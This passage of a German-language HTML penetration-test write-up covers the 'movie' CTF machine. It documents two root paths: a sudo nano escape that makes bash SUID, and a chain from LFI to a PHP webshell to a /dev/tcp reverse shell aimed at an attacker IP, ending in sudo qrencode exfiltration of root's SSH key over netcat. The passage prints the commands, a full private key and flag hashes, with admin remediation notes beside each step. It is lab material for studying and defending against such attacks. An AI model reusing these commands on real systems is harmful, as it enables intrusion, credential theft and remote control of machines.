+3.  Führen Sie einen Befehl aus, der Ihnen eine Root-Shell gibt, z.B. `cp /bin/bash /tmp/rtbash && chmod +s /tmp/rtbash` gefolgt von `/tmp/rtbash -p`, oder direkt eine Reverse Shell. Die im Text gezeigte "kluge Variante" nutzt `Ctrl+T`.
+<br><strong>Empfehlung (Admin):** Diese `sudo`-Regel ist extrem gefährlich und sollte sofort entfernt werden. Gewähren Sie niemals `sudo`-Rechte für Texteditoren auf kritischen Systemdateien. Wenn ein Benutzer Passwörter ändern muss, verwenden Sie `passwd`. Wenn `/etc/passwd` bearbeitet werden muss, nutzen Sie `vipw`. Prinzip der geringsten Rechte strikt anwenden und `NOPASSWD` nur in absolut notwendigen und kontrollierten Fällen verwenden.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">tarantino@movie:~$ <span class="command">lsattr /etc/passwd</span></div>
+                     <pre><span class="command">----i---------e------- /etc/passwd</span></pre>
+                 </div>
+             </div>
+            <p class="analysis"><strong>Analyse:</strong> Die Attribute der Datei `/etc/passwd` werden mit `lsattr` überprüft.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Das `i`-Attribut (immutable) ist gesetzt. Das bedeutet, die Datei kann nicht geändert, gelöscht, umbenannt werden, es können keine Links darauf erstellt werden und keine Daten hineingeschrieben werden – auch nicht von Root. Dies erklärt, warum ein direkter *Edit* der Datei mit `sudo nano` fehlschlagen würde. Es hindert jedoch nicht daran, *innerhalb* des als Root laufenden `nano`-Prozesses Befehle auszuführen.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):** Das Immutable-Bit verhindert das direkte Modifizieren von `/etc/passwd`, aber der `sudo nano`-Exploit über die Befehlsausführung innerhalb von `nano` funktioniert trotzdem. Fahren Sie mit dem Exploit fort.
+<br><strong>Empfehlung (Admin):** Das Setzen des Immutable-Bits auf kritische Dateien wie `/etc/passwd` und `/etc/shadow` ist eine gute Härtungsmaßnahme gegen versehentliche Änderungen oder bestimmte Angriffe. Es schützt jedoch nicht vor unsicheren `sudo`-Regeln wie der hier vorhandenen.</p>
+
+             <p class="analysis"><strong>Analyse:</strong> Parallel wird eine Local File Inclusion (LFI)-Schwachstelle auf dem Webserver untersucht. Es wird versucht, über den `get_page`-Parameter in `index.php` die Datei `/etc/passwd` zu lesen.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">tarantino@movie:~$ <span class="command">curl http://localhost/index.php?get_page=../../../etc/passwd</span></div>
+                     <pre><span class="command">root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
+systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
+systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
+messagebus:x:103:109::/nonexistent:/usr/sbin/nologin
+systemd-timesync:x:104:110:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
+avahi-autoipd:x:105:113:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/usr/sbin/nologin
+sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
+tarantino:x:1000:1000:tarantino,,,:/home/tarantino:/bin/bash
+systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
+mysql:x:107:115:MySQL Server,,,:/nonexistent:/bin/false</span></pre>
+                 </div>
+             </div>
+            <p class="evaluation"><strong>Bewertung:</strong> Der `curl`-Befehl ist erfolgreich und gibt den Inhalt von `/etc/passwd` zurück. Dies bestätigt eine LFI-Schwachstelle im `get_page`-Parameter von `index.php`. Der Webserver (`www-data`) hat Leserechte auf `/etc/passwd`. Diese LFI kann potenziell genutzt werden, um andere sensible Dateien zu lesen oder, falls PHP-Dateien inkludiert werden können, zu Remote Code Execution (RCE) führen.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):** Die LFI kann genutzt werden, um RCE zu erreichen:
+1.  Erstellen Sie eine einfache PHP-Webshell (wie im nächsten Schritt gezeigt).
+2.  Laden Sie die Webshell an einen Ort hoch, auf den `www-data` Lesezugriff hat (z.B. `/tmp`, `/var/tmp`, `/dev/shm`).
+3.  Nutzen Sie die LFI, um die hochgeladene Webshell zu inkludieren und auszuführen (`?get_page=../../../dev/shm/shell.php&cmd=...`).
+<br><strong>Empfehlung (Admin):** Beheben Sie die LFI-Schwachstelle dringend durch strikte Eingabevalidierung und Sanitisierung des `get_page`-Parameters. Verwenden Sie Whitelists für erlaubte Dateien statt Blacklists. Konfigurieren Sie PHP so, dass `allow_url_include` deaktiviert ist und der `open_basedir`-Parameter gesetzt wird, um den Dateizugriff des Webservers einzuschränken.</p>
+
+             <p class="analysis"><strong>Analyse:</strong> Aufbauend auf der LFI-Schwachstelle wird versucht, RCE zu erlangen. Zuerst wird eine minimale PHP-Webshell (` system($GET["cmd"]); ?>`) erstellt und in `/dev/shm/shell.php` gespeichert. `/dev/shm` ist ein temporäres Dateisystem im RAM, das oft von allen Benutzern beschreibbar ist.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">tarantino@movie:~$ <span class="command">echo ' system($GET["cmd"]); ?>' >/dev/shm/shell.php</span></div> <!-- & wurde maskiert -->
+                 </div>
+             </div>
+              <p class="analysis"><strong>Analyse Fortsetzung:** Anschließend wird die LFI-Schwachstelle erneut mit `curl` genutzt, aber diesmal wird versucht, die gerade erstellte Webshell (`../../../dev/shm/shell.php`) zu inkludieren. Gleichzeitig wird der `cmd`-Parameter an die Webshell übergeben. Der Wert des `cmd`-Parameters ist ein URL-kodierter Bash-Reverse-Shell-Befehl, der eine Verbindung zum Angreifer-System (`192.168.2.153`) auf Port `4444` herstellen soll.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">tarantino@movie:~$ <span class="command">curl "http://localhost/index.php?get_page=../../../dev/shm/shell.php&cmd=%2Fbin%2Fbash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.2.153%2F4444%200%3E%261"</span></div> <!-- & wurde maskiert -->
+                 </div>
+             </div>
+              <p class="analysis"><strong>Analyse Fortsetzung:** Auf dem Angreifer-System wird ein Netcat-Listener gestartet, um die eingehende Reverse Shell auf Port 4444 abzufangen.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+ └─# <span class="command">nc -lvnp 4444</span></div>
+                     <pre>
+ listening on [any] 4444 ...
+ <span class="password">connect to [192.168.2.153] from (UNKNOWN) [192.168.2.117] 59502</span>
+ bash: cannot set terminal process group (8069): Inappropriate ioctl for device
+ bash: no job control in this shell
+ </pre>
+                    <div class="prompt">www-data@movie:/var/www/html$</div> <!-- Shell erhalten! -->
+                 </div>
+             </div>
+             <p class="evaluation"><strong>Bewertung:</strong> Die Kombination aus LFI und der Möglichkeit, eine Webshell in einem inkludierbaren Verzeichnis zu platzieren, führt erfolgreich zu RCE. Der Angreifer erhält eine Reverse Shell als Benutzer `www-data` (der Benutzer, unter dem der Webserver läuft). Die initiale Shell ist oft nicht voll interaktiv.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):** Stabilisieren Sie die erhaltene `www-data`-Shell (siehe nächster Schritt). Nutzen Sie diesen Zugriff, um nach weiteren Privilegieneskalations-Vektoren zu suchen, falls der `sudo nano`-Weg nicht funktioniert oder übersehen wurde. Suchen Sie nach Datenbank-Credentials in Webserver-Konfigurationsdateien, prüfen Sie `sudo -l` für `www-data` etc.
+<br><strong>Empfehlung (Admin):** Beheben Sie die LFI-Schwachstelle (siehe vorherige Empfehlung). Verhindern Sie das Schreiben in Verzeichnisse wie `/dev/shm` durch den Webserver-Benutzer, wenn nicht unbedingt nötig. Führen Sie den Webserver mit minimalen Rechten aus. Überwachen Sie ausgehende Netzwerkverbindungen vom Webserver.</p>
+
+             <p class="analysis"><strong>Analyse:</strong> Die erhaltene `www-data`-Reverse-Shell wird mit Standardtechniken stabilisiert, um eine interaktivere Umgebung zu schaffen.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">www-data@movie:/var/www/html$ <span class="command">python3 -c 'import pty;pty.spawn("/bin/bash")'</span></div>
+                     <pre>www-data@movie:/var/www/html$</pre>
+                     <div class="prompt">www-data@movie:/var/www/html$ <span class="command">export TERM=xterm</span></div>
+                     <div class="prompt">www-data@movie:/var/www/html$ <span class="command">[Ctrl+Z]</span></div> <!-- Sendet nc in den Hintergrund auf der Angreifer-Maschine -->
+                     <pre>zsh: suspended  nc -lvnp 4444</pre>
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+ └─# <span class="command">stty raw -echo;fg</span></div> <!-- Setzt lokales Terminal auf raw, holt nc zurück -->
+                      <pre>
+ [1]  + continued  nc -lvnp 4444
+                                reset <span class="command">[Enter drücken]</span>
+ </pre>
+                     <div class="prompt">www-data@movie:/var/www/html$</div> <!-- Voll interaktive Shell -->
+                 </div>
+             </div>
+             <p class="evaluation"><strong>Bewertung:</strong> Die Schritte sind erfolgreich. Zuerst wird mit Python eine bessere Bash-Shell erzeugt. Dann wird die `TERM`-Variable gesetzt, damit Programme wie `clear` funktionieren. Schließlich wird durch das Hintergrundsenden des `nc`-Listeners, das Setzen des lokalen Terminals auf `raw -echo` und das Wiederaufnehmen von `nc` mit `fg` eine voll interaktive TTY-Shell erreicht.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):** Dies ist eine essenzielle Technik für die Arbeit mit Reverse Shells. Fahren Sie nun mit der Enumeration und Privilegieneskalation als `www-data` fort.
+<br><strong>Empfehlung (Admin):** Diese Schritte sind Standard für Angreifer. Der Fokus muss auf der Verhinderung des initialen Zugriffs (LFI/RCE) liegen.</p>
+
+              <p class="analysis"><strong>Analyse:</strong> Als `www-data` wird nach Privilegieneskalationsmöglichkeiten gesucht. Es wird festgestellt (Schritt `sudo -l` für www-data nicht gezeigt, aber impliziert), dass `www-data` den Befehl `qrencode` mit `sudo` ausführen darf, speziell um den Inhalt einer Datei (`-r`) in eine Ausgabedatei (`-o`) als QR-Code zu schreiben. Dies wird ausgenutzt, um den privaten SSH-Schlüssel des Root-Benutzers (`/root/.ssh/id_rsa`) zu lesen und als QR-Code in `/tmp/root` (wahrscheinlich eine Bilddatei) zu speichern.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">www-data@movie:/var/www/html$ <span class="command">sudo /usr/bin/qrencode -r /root/.ssh/id_rsa -o /tmp/root</span></div>
+                 </div>
+             </div>
+              <p class="analysis"><strong>Analyse Fortsetzung:** Um die erstellte QR-Code-Datei (`/tmp/root`) vom Zielsystem zum Angreifer zu übertragen, startet `www-data` einen Netcat-Listener auf Port 5555 und leitet den Inhalt der Datei (`< /tmp/root`) direkt in die Verbindung, sobald sich ein Client verbindet.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">www-data@movie:/tmp$ <span class="command">nc -vlnp 5555 < root</span></div>
+                     <pre>
+ listening on [any] 5555 ...
+ connect to [192.168.2.117] from (UNKNOWN) [192.168.2.153] 46490 <span class="password">[Dateiübertragung findet statt]</span>
+ </pre>
+                    <div class="prompt">www-data@movie:/tmp$</div> <!-- Prompt kehrt nach Verbindungsende zurück -->
+                 </div>
+             </div>
+              <p class="analysis"><strong>Analyse Fortsetzung:** Auf dem Angreifer-System verbindet sich Netcat mit dem Listener auf dem Zielsystem (Port 5555) und speichert die empfangenen Daten (den QR-Code) in einer Datei namens `root.png`.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+ └─# <span class="command">nc movie.hmv 5555 > root.png</span></div>
+                     <pre>[Verbindung wird aufgebaut, Daten empfangen, Verbindung geschlossen]</pre>
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+ └─# <span class="command">ll</span></div>
+                     <pre>
+ ...
+ -rw-r--r--  1 root root    6693 31. Okt 01:35 <span class="command">root.png</span>
+ ...
+ </pre>
+                      <div class="prompt">┌──(root㉿cyber)-[~]
+ └─# <span class="command">mv root.png /home/cyber/Downloads</span></div>
+                 </div>
+             </div>
+              <p class="analysis"><strong>Analyse Fortsetzung:** Der Angreifer verwendet einen QR-Code-Decoder (z.B. online bei `zxing.org` oder ein lokales Tool), um die Bilddatei `root.png` zu dekodieren. Das Ergebnis ist der private SSH-Schlüssel des Root-Benutzers.</p>
+              <div class="code-block">
+                  <div class="terminal">
+                     <div class="prompt">[Kein Prompt - Ausgabe des QR-Decoders]</div>
+                     <pre><span class="password">-----BEGIN OPENSSH PRIVATE KEY-----
+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
+-----END OPENSSH PRIVATE KEY-----</span></pre>
+                  </div>
+              </div>
+               <p class="analysis"><strong>Analyse Fortsetzung:** Der entschlüsselte private Schlüssel wird in eine Datei namens `idroot` gespeichert und die Berechtigungen werden auf `600` gesetzt.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+ └─# <span class="command">vi idroot</span></div>
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+ └─# <span class="command">chmod 600 idroot</span></div>
+                 </div>
+             </div>
+              <p class="analysis"><strong>Analyse Fortsetzung:** Schließlich wird versucht, sich per SSH als `root` mit dem extrahierten privaten Schlüssel (`-i idroot`) beim Zielsystem anzumelden.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+ └─# <span class="command">ssh -i idroot root@movie.hmv</span></div>
+                     <pre>
+ Linux movie.hmv 5.10.0-18-amd64 #1 SMP Debian 5.10.140-1 (2022-09-02) x86_64
+
+ The programs included with the Debian GNU/Linux system are free software;
+ the exact distribution terms for each program are described in the
+ individual files in /usr/share/doc/*/copyright.
+
+ Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+ permitted by applicable law.
+ Last login: Wed Oct  5 08:15:14 2022 from 192.168.0.22
+ </pre>
+                    <div class="prompt">root@movie:~#</div> <!-- Root-Zugriff! -->
+                 </div>
+             </div>
+            <p class="evaluation"><strong>Bewertung:</strong> Der SSH-Login als `root` mit dem extrahierten Schlüssel ist erfolgreich. Dies stellt einen weiteren Weg zur vollständigen Kompromittierung des Systems dar (Privilegieneskalation von `www-data` zu `root`). Diese Methode war aufwändiger ("umständliche lange Variante") als der `sudo nano`-Exploit.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):** Root-Zugriff wurde erlangt. Holen Sie das Root-Flag. Dokumentieren Sie diesen Privilegieneskalations-Pfad über `sudo qrencode`.
+<br><strong>Empfehlung (Admin):** Entziehen Sie `www-data` (oder jedem anderen unprivilegierten Benutzer) die `sudo`-Rechte für `qrencode` oder andere Befehle, die zum Lesen beliebiger Dateien verwendet werden können. Schützen Sie den privaten SSH-Schlüssel des Root-Benutzers extrem sorgfältig (starke Dateiberechtigungen, idealerweise passwortgeschützter Schlüssel oder gar kein direkter Root-Login per SSH erlaubt, nur über `su` oder `sudo` von einem Standardbenutzer). Überprüfen Sie alle `sudo`-Regeln auf potenzielle Risiken.</p>
+
+        </section>
+
+        <section id="poc">
+            <h2>Proof of Concept (POC)</h2>
+             <p class="analysis"><strong>Analyse:</strong> Dieser Abschnitt demonstriert zwei Methoden zur Erlangung von Root-Rechten, die während des Tests identifiziert wurden.</p>
+
+            <h3>POC Methode 1: sudo nano Exploit (Schnelle Variante)</h3>
+            <p class="analysis"><strong>Kurzbeschreibung:</strong> Der Benutzer `tarantino` hat `sudo`-Rechte, um `/usr/bin/nano /etc/passwd` ohne Passwort auszuführen. Obwohl `/etc/passwd` unveränderlich ist, kann die Befehlsausführungsfunktion innerhalb von `nano` genutzt werden, um eine SUID-Root-Shell zu erstellen.</p>
+            <p class="analysis"><strong>Voraussetzungen:</strong> SSH-Zugriff als Benutzer `tarantino`.</p>
+            <p class="analysis"><strong>Schritt-für-Schritt-Anleitung:</strong></p>
+            <ol>
+                <li>Als `tarantino` einloggen.</li>
+                <li>Befehl ausführen: `sudo /usr/bin/nano /etc/passwd`</li>
+                <li>Innerhalb von `nano`:
+                    <ul>
+                        <li>Drücken Sie `Ctrl+T` (oder `Ctrl+R` dann `Ctrl+X` je nach Version).</li>
+                        <li>Geben Sie den Befehl `chmod u+s /bin/bash` ein und drücken Sie Enter.</li>
+                        <li>Beenden Sie `nano` mit `Ctrl+X`.</li>
+                    </ul>
+                </li>
+                <li>Führen Sie die SUID-Shell aus: `/bin/bash -p`</li>
+            </ol>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">tarantino@movie:~$ <span class="command">sudo /usr/bin/nano /etc/passwd</span></div>
+                     <pre>[Nano öffnet sich...]
+[Innerhalb von Nano: Ctrl+T, dann 'chmod u+s /bin/bash', Enter, Ctrl+X]</pre>
+                     <div class="prompt">tarantino@movie:~$ <span class="command">/bin/bash -p</span></div>
+                     <div class="prompt">bash-5.1# <span class="command">id</span></div>
+                     <pre><span class="password">uid=1000(tarantino) gid=1000(tarantino) euid=0(root) groups=1000(tarantino),24(cdrom),...</span></pre>
+                     <div class="prompt">bash-5.1#</div>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Erwartetes Ergebnis:</strong> Eine Root-Shell (`euid=0`).</p>
+             <p class="analysis"><strong>Beweismittel:</strong> Die Ausgabe des `id`-Befehls zeigt `euid=0(root)`.</p>
+
+            <h3>POC Methode 2: LFI zu RCE zu sudo qrencode Exploit (Lange Variante)</h3>
+             <p class="analysis"><strong>Kurzbeschreibung:</strong> Eine LFI-Schwachstelle in `index.php` wird genutzt, um eine Webshell in `/dev/shm` auszuführen und eine Reverse Shell als `www-data` zu erhalten. Anschließend werden `sudo`-Rechte für `qrencode` missbraucht, um den privaten SSH-Schlüssel von Root zu lesen, als QR-Code zu exfiltrieren und sich damit als Root anzumelden.</p>
+            <p class="analysis"><strong>Voraussetzungen:</strong> Netzwerkzugriff auf den Webserver, `nc` auf Angreifer-System, QR-Code-Decoder.</p>
+            <p class="analysis"><strong>Schritt-für-Schritt-Anleitung:</strong></p>
+             <ol>
+                 <li>Webshell erstellen: `echo ' system($GET["cmd"]);  ' > /tmp/shell_on_attacker.php` (Annahme: wird auf Ziel via tarantino shell platziert)</li>
+                 <li>Auf Angreifer-System Listener starten: `nc -lvnp 4444`</li>
+                 <li>LFI->RCE auslösen (als tarantino oder via curl von außen): `curl "http://movie.hmv/index.php?get_page=../../../dev/shm/shell.php&cmd=%2Fbin%2Fbash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F[ATTACKER_IP]%2F4444%200%3E%261"`</li>
+                 <li>In der erhaltenen `www-data`-Shell: `sudo /usr/bin/qrencode -r /root/.ssh/id_rsa -o /tmp/root_qr.png`</li>
+                 <li>Auf Zielsystem Listener starten: `nc -lnvp 5555 < /tmp/root_qr.png`</li>
+                 <li>Auf Angreifer-System QR-Code empfangen: `nc movie.hmv 5555 > root_key.png`</li>
+                 <li>QR-Code `root_key.png` dekodieren, um Root-SSH-Key zu erhalten.</li>
+                 <li>Key speichern (`id_root_from_qr`), `chmod 600 id_root_from_qr`.</li>
+                 <li>Als Root einloggen: `ssh -i id_root_from_qr root@movie.hmv`</li>
+             </ol>
+             <p class="analysis"><strong>Erwartetes Ergebnis:</strong> SSH-Login als `root`.</p>
+             <p class="analysis"><strong>Beweismittel:</strong> Der erfolgreiche SSH-Login als `root` und der anschließende `cat /root/root.txt`.</p>
+
+             <p class="evaluation"><strong>Risikobewertung:</strong> Beide Methoden führen zur vollständigen Kompromittierung des Systems mit Root-Rechten. Die `sudo nano`-Fehlkonfiguration stellt ein hohes Risiko dar, da sie einem relativ unprivilegierten Benutzer direkten Root-Zugriff ermöglicht. Die LFI/RCE/qrencode-Kette ist komplexer, zeigt aber ebenfalls ein hohes Risiko durch die Kombination mehrerer Schwachstellen und Fehlkonfigurationen (LFI, unsichere `sudo`-Rechte für `www-data`).</p>
+             <p class="recommendation"><strong>Empfehlungen:</strong>
+*   **Admin:** Beheben Sie die `sudo nano`-Fehlkonfiguration sofort. Beheben Sie die LFI-Schwachstelle in `index.php`. Überprüfen Sie alle `sudo`-Regeln (insbesondere für `www-data`) auf unsichere Berechtigungen. Schützen Sie SSH-Schlüssel und Konfigurationsdateien. Implementieren Sie das Prinzip der geringsten Rechte konsequent.
+*   **Pentester:** Beide Pfade dokumentieren. Die `sudo nano`-Methode ist effizienter. Die LFI/qrencode-Kette zeigt tiefere Einblicke in Web- und Systemschwachstellen.</p>
+        </section>
+
+        <section id="flags">
+             <div class="flag-container">
+                 <h2 class="flag-heading">Flags</h2>
+                 <div class="flag-entry">
+                     <div class="flag-command">cat user.txt</div>
+                     <div class="flag-value"><span class="password">0508e6506868d4b9d3f8545054d3e8db</span></div>
+                 </div>
+                 <div class="flag-entry">
+                     <div class="flag-command">cat root.txt</div>
+                     <div class="flag-value"><span class="password">dff82e2a59c62c1884b32973fd6e6f52</span></div>
+                 </div>
+             </div>
+        </section>
+ 
+    <footer class="footer">
+        <p>DarkSpirit - Cyber Security Reports</p>
+        <p>Berichtsdatum: 5. Oktober 2022</p> <!-- Datum angepasst -->
+    </footer>
+</body>
+</html>
